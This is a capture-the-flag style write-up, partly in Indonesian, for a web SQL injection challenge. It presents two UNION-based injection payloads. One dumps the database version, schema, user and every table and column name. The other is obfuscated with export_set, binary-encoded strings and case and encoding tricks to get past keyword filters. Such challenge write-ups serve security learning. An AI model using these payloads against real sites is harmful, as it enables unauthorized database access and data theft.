
# Challenge 2 solution

## Table of Contents
- [Challenge 2 solution](#challenge-2-solution)
  - [Table of Contents](#table-of-contents)
  - [Based information](#based-information)
  - [Solution](#solution)
  - [Penutup](#penutup)

## Based information

* Target    : [Challenge2](https://def-chall.000webhostapp.com/challenge2)
* Level     : IDK
* Task      : Print Image, Leetname, User, Version, Database, Dios 
* Rules     : Dont use version(), Database(), concat(), Hex, Char(), +, -- - , --, user()
* Solver    :
   - @Irfan 'SQLI



## Solution

My query => (inspect , insert ke radio button value)
```
.naruto'union select 1,2,( select group_concat( '<br>','</h1><h1>./GreyX</h1>','<br>','version : ',@@version,'<br>Database : ',schema(),'<br>User : ',current_user(),'<br>================<br>',( (select group_concat('<br>',TABLE_NAME,'::',COLUMN_NAME) from information_schema.columns where table_schema=schema()) ) ) ),'https://animemotivation.com/wp-content/uploads/2018/02/cute-anime-girl.jpg.webp',5,6#
```

Images :
* https://ibb.co/pRVsYpN
* https://ibb.co/3c30VXL


@Irfan 'SQLI => (insert dengan menggunakan hackbar)
```
categories=.naruto' UnIoN SeLeCt 1,2,export_set(5,export_set(1,0b0011110001101000001100010011111001010100011010000110010101010110011000010110110001100101001111000010111101101000001100010011111000111100011000100111001000111110,0b00111100011000100111001000111110,@@GLOBAL.VERSION,2),(Select%2Bexport_set(5,@:=0,(select%2Bcount(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0b00111100011011000110100100111110,2),column_name,0b0011110100111110,2)),@,2)),export_set(1,SYSTEM_USER(),schema(),0b00111100011000100111001000111110,2),2),0b0110100001110100011101000111000001110011001110100010111100101111011010010010111001110000011010010110111001101001011011010110011100101110011000110110111101101101001011110011001000110011001101100111100000101111011000010011000100101111001101000110000100101111001101010011001000101111011000010011000100110100011000010011010100110010011001000011011000110010001101100011010101100011011000010011011100110111011000010011011001100001001101100110010101100010011000010011001100110011001110000110001000110011001101000110001000110001001100110110001000101110011010100111000001100111,5,6;%00
```
Images :
* https://ibb.co/MD0Cx7h



## Penutup
Terimakasih, buat yang sudah berkenan meluangkan waktu untuk mencoba challenge ini :)